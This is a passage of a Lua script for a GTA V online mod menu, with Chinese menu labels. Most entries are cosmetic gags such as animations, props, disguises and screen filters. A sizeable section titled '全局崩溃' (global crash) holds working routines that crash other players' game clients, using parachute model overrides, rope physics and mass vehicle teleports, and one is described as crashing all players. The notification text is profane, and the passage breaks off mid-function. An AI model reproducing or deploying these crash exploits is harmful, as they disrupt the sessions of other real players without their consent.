    end)
end)

menu.on_blur(s_forcefield_range_slider, function()
    s_forcefield_range_on_focus = false
end)
    menu.toggle_loop(happy, "爆炸圈", {}, "在你的周围形成一圈从前从前赐予你的连续爆炸，用来抵挡不速之客！嘿嘿嘿", function ()
        baozhanquan()
    end)
menu.toggle_loop(happy, "杰诺斯", {""}, "", function()
    Janos()
    end)
menu.toggle_loop(happy, "神指", {"godfinger"}, "按B键可以控制实物！！（线下不可用）。", function()--========BY Wiriscript---thanks
    godfinger()
end)
menu.toggle_loop(happy, "无重感", {"jedimode"}, "鼠标左键和右键配合让周围的车辆飞起来和猛猛的砸下去 by黑手神鹰", function()
	heishoushenying()
end, function()
	state = 0
end)
local appearance = menu.list(happy, "伪装")
local disguise_state
menu.toggle(appearance, "伪装", {"disguise"}, "", function(state)
    disguise_state = state

    if disguise_state then
        local invisibility_select = menu.ref_by_path("Self>Appearance>Invisibility")
        local object_hash = util.joaat(disguise_objects[disguise_object])
        local player_pos = players.get_position(players.user())
        request_model(object_hash)
        local object = entities.create_object(object_hash, player_pos)
        menu.set_value(invisibility_select, 2)
        ENTITY.SET_ENTITY_COLLISION(object, false, false)

        while disguise_state and players.exists(players.user()) do
            player_pos = players.get_position(players.user())
            local player_rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 5)
            ENTITY.SET_ENTITY_COORDS(object, player_pos.x, player_pos.y, player_pos.z - 1, false, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(object, 0, 0, player_rot.z, false, false, false, false)
            util.yield()
        end

        entities.delete_by_handle(object)
        menu.set_value(invisibility_select, 0)
    end
end)

local disguise_object_slider = menu.slider_text(
    appearance, "伪装物体", {"disguiseobject"}, "", disguise_names, function()end
)

util.create_tick_handler(function()
    if not players.exists(players.user()) then
        return false
    end

    disguise_object = menu.get_value(disguise_object_slider)
end)
jibenyule = menu.list(funfeatures, "基本娱乐", {}, "", function(); end)
menu.toggle(jibenyule, "蔡徐坤", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("random@peyote@chicken") do 
        STREAMING.REQUEST_ANIM_DICT("random@peyote@chicken")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    chicken = OBJECT.CREATE_OBJECT(util.joaat("chicken"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "random@peyote@chicken", "wakeup", 3, 3, -1, 51, 0, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(chicken, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(chicken)
    end
end)
menu.toggle(jibenyule, "干你", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@mp_player_intcelebrationfemale@knuckle_crunch") do 
        STREAMING.REQUEST_ANIM_DICT("anim@mp_player_intcelebrationfemale@knuckle_crunch")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    knucklecrunch = OBJECT.CREATE_OBJECT(util.joaat("knucklecrunch"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@mp_player_intcelebrationfemale@knuckle_crunch", "knuckle_crunch", 3, 3, -1, 51, 0, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(knucklecrunch, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(knucklecrunch)
    end
end)
menu.toggle(jibenyule, "僵尸", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@amb@clubhouse@bar@drink@idle_a") do 
        STREAMING.REQUEST_ANIM_DICT("anim@amb@clubhouse@bar@drink@idle_a")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    Bartender = OBJECT.CREATE_OBJECT(util.joaat("Bartender"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@amb@clubhouse@bar@drink@idle_a", "idle_a_bartender", 3, 3, -1, 51, 0, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Bartender, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(Bartender)
    end
end)
menu.toggle(jibenyule, "鞠躬", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@arena@celeb@podium@no_prop@") do 
        STREAMING.REQUEST_ANIM_DICT("anim@arena@celeb@podium@no_prop@")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    bow = OBJECT.CREATE_OBJECT(util.joaat("bow"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@arena@celeb@podium@no_prop@", "regal_c_1st", 3, 3, -1, 51, 0, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(bow, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(bow)
    end
end)
menu.toggle(jibenyule, "忍者跑",{""}, "忍者跑步动作",function(on)
    renzhepao(on)
end)
menu.toggle(jibenyule, "举起手来(按x)",{""}, "",function(state)
    handsup = state
    while handsup do
        juqishoulai()
        util.yield()
    end
end)
menu.toggle_loop(jibenyule, "发光", {}, "", function()
    openlight()
    end)
menu.toggle(jibenyule, "火男", {"fireman"}, "", function(on)
    huonan(on)
end)
local bigbigbig = false
        menu.toggle(jibenyule, "大锤", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)
menu.toggle(jibenyule, "翅膀", {"chibang"}, "在你后背生成一双翅膀", function(on_toggle)
    chibangnie(on_toggle)
end)
menu.toggle(jibenyule, "雪人",{""}, "Snow man",function(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)--v_ilev_exball_grey
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end)
menu.toggle_loop(jibenyule, "罪城的水", {""}, "惯用Vice city的准则（碰水就死）", function()--===========jinx========thanks
    VicecityWater()
end)
local nearest = get_closest_ped_to_ped(ENTITY.GET_ENTITY_COORDS(terrorist), terrorist)
menu.action(jibenyule,"一个疯子", {"杀光光"}, "生成一个会不断杀死和猎杀附近邪恶的人！！！", function()
    util.toast("记住 杀光光.")
    local terror_model = util.joaat("s_m_y_xmech_02")
    request_model_load(terror_model)
    local terrorist = entities.create_ped(28, terror_model, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1.0, 0.0), math.random(270))
    WEAPON.GIVE_WEAPON_TO_PED(terrorist, 171789620, 1000, false, true)
    PED.SET_PED_COMBAT_ABILITY(terrorist, 2)
    PED.SET_PED_AS_ENEMY(terrorist, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(terrorist,13, true)
    while true do
        if PED.IS_PED_FATALLY_INJURED(terrorist) or not ENTITY.DOES_ENTITY_EXIST(terrorist) then 
            break 
        end
        local nearest = get_closest_ped_to_ped(ENTITY.GET_ENTITY_COORDS(terrorist), terrorist)
        TASK.TASK_COMBAT_PED(terrorist, nearest[1])
        util.yield(2000)
    end
end)
menu.action(jibenyule,"安放烟花",{},"",function()--===heezy
    anfangyanhua()
end)	
menu.action(jibenyule,"烟花发射",{},"",function(f)	--===heezy
    yanhuafashe(f)
end)
menu.toggle(jibenyule, "请做出你的选择",{""}, "做出来的人一般智商都很高！！！",function(state)
    zcndxz(state)
end)
menu.divider(funfeatures, "视觉效果")
menu.click_slider(funfeatures, "醉酒模式", {}, "", 0, 5, 1, 1, function(val)
    zuijiumoshi(val)
end)
local visual_fidelity = menu.list(funfeatures, "视觉增强", {}, "")
for id, data in pairs(visual_stuff) do
    local visual_name = data[1]
    local visual_thing = data[2]
    local visual = false
    local visual_toggle
    visual_toggle = menu.toggle(visual_fidelity, visual_name, {""}, "", function(toggled)
        visual = toggled
        if not menu.get_value(visual_toggle) then
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        return end

        while visual do
            GRAPHICS.SET_TIMECYCLE_MODIFIER(visual_thing)
            menu.trigger_commands("shader off")
            util.yield(250)
        end
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end)
end 
local drug_mode = menu.list(funfeatures, "药物过滤器", {}, "")
for id, data in pairs(drugged_effects) do
    menu.toggle(drug_mode, data, {}, "", function(toggled)
        if toggled then
            GRAPHICS.SET_TIMECYCLE_MODIFIER(data)
            menu.trigger_commands("shader off")
        else
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
        end
    end)
end

local visions = menu.list(funfeatures, "屏幕效果", {}, "")
for id, data in pairs(effect_stuff) do
    local effect_name = data[1]
    local effect_thing = data[2]
    local effect = false
    local effect_toggle
    effect_toggle = menu.toggle(visions, effect_name, {""}, "", function(toggled)
        effect = toggled
        if not menu.get_value(effect_toggle) then
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        return end

        while effect do
            GRAPHICS.ANIMPOSTFX_PLAY(effect_thing, 5, true)
            util.yield(1000)
        end
    end)
end 
menu.divider(funfeatures, "攻击特效")--===========wiri=====thanks
menu.toggle_loop(funfeatures, '喷火器', {'JSflamethrower'}, '将加特林变成火焰喷射器.', function()
    penhuoqi()
end)

menu.toggle_loop(funfeatures, "小丑枪", {"shootingfx"}, "", function ()
    shootingeffect()
end)

menu.slider_text(funfeatures, "设置效果", {}, "", {"小丑爆炸","小丑喷射"}, function (index)
	setshootingeffect(index)
end)


vf = menu.list(vehicle, "冻结选项", {}, "", function(); end)
local frozen_vehicles = {}
local function update_frozen_vehicles()
    for _, frozen_vehicle in pairs(frozen_vehicles) do
        if ENTITY.DOES_ENTITY_EXIST(frozen_vehicle.vehicle) then
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, true)
        end
    end
end
local frozen_vehicles_menu_list
local function refresh_frozen_vehicles_menu_list()
    menu.delete(frozen_vehicles_menu_list)
    frozen_vehicles_menu_list = menu.list(vf, "已冻结的载具")
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        menu.action(frozen_vehicles_menu_list, frozen_vehicle.name, {"unfreeze"..index}, "点击解冻载具", function()
            table.remove(frozen_vehicles, index)
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, false)
            refresh_frozen_vehicles_menu_list()
        end)
    end
end
local function add_frozen_vehicle(vehicle)
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        if frozen_vehicle.vehicle == vehicle then
            return
        end
    end
    local model = ENTITY.GET_ENTITY_MODEL(vehicle)
    local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(model)
    table.insert(frozen_vehicles, {
        name=name,
        vehicle=vehicle
    })
    refresh_frozen_vehicles_menu_list()
    update_frozen_vehicles()
end
menu.action(vf, "冻结载具", {"freeze"}, "将当前载具冻结在原地[一般用来配合模型使用，比如冻结个航母在天上，嘻嘻]", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if vehicle then
        add_frozen_vehicle(vehicle)
    end
end)
frozen_vehicles_menu_list = menu.list(vf, "已冻结的载具")
local tick_counter = 0
util.create_tick_handler(function()
    if tick_counter % 1000 == 0 then
        update_frozen_vehicles()
    end
    tick_counter = tick_counter + 1
    return true
end)
menu.divider(all, "全局崩溃")
    menu.action(all, "人物伞崩V1", {}, "", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end)
menu.action(all,"人物伞崩V2", {}, "", function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        end
end)
menu.action(all,"人物伞崩V3",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash =192829538
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 	192829538
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)
menu.action(all,"人物伞崩V4",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)
menu.action(all,"CARGO崩溃",{},"崩溃所有玩家",function()
    CARGO()
    end)
menu.action(all, "大自然全局崩溃", {}, "", function()
    nature()
end) 
function nature()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(25)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        local pos = players.get_position(user)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
        end
menu.action(all, "懂哥崩溃", {"By MMT"}, "", function()
    util.toast("I'll try to convince them to leave :) ")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
    util.yield(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
 end)
 menu.action(all, "数学崩溃", {}, "", function()
    math1()
    notification("滚吧！！" ,colors.green)
end)
function math1()
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
     local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
     playpos.x = playpos.x + 10
     local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
     local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local pedc = CreatePed(26, 2597531625, playpos, 0)
     local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
     PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
     util.yield(2500)
     PHYSICS.DELETE_CHILD_ROPE(ropec)
     entities.delete_by_handle(carc)
     entities.delete_by_handle(pedc)
end
 TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
local function rotatePoint(x, y, center, degrees)
    local radians = math.rad(degrees)
    local new_x = (x - center.x) * math.cos(radians) - (y - center.y) * math.sin(radians)
    local new_y = (x - center.x) * math.sin(radians) + (y - center.y) * math.cos(radians)
    return center.x + new_x, center.y + new_y * 1920 / 1080
end
 menu.action(all, "全局顶崩", {}, "", function()
    unknown()
 end)
function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end
function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
 function unknown()
    local spped = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
    SelfPlayerPos.x = SelfPlayerPos.x + 10
    TTPos.x = TTPos.x + 10
    local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
    local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
    local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
    util.yield(3500)
    PHYSICS.DELETE_CHILD_ROPE(ropec)
    entities.delete_by_handle(pedc)
end
function notification(message, color)
    C_HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
    local picture = "CHAR_SOCIAL_CLUB"
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
        util.yield()
    end
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
    title = "&#8721;CqCq温馨提示"
    if color == colors.black or color == colors.green then
        subtitle = "看这里操你妈的"
    elseif color == colors.black then
        subtitle = "看这里操你妈的"
    else
        subtitle = "看这里操你妈的"
    end
    HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
    util.log(message)
end
notification("欢迎大帅逼", colors.green)
 menu.action(all, "5G崩溃", {""}, "", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()
  for i = 1, #veh do
  NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
  ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
  TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
  TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
  end
end)
menu.action(all,"冷战崩溃",{},"崩崩崩",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
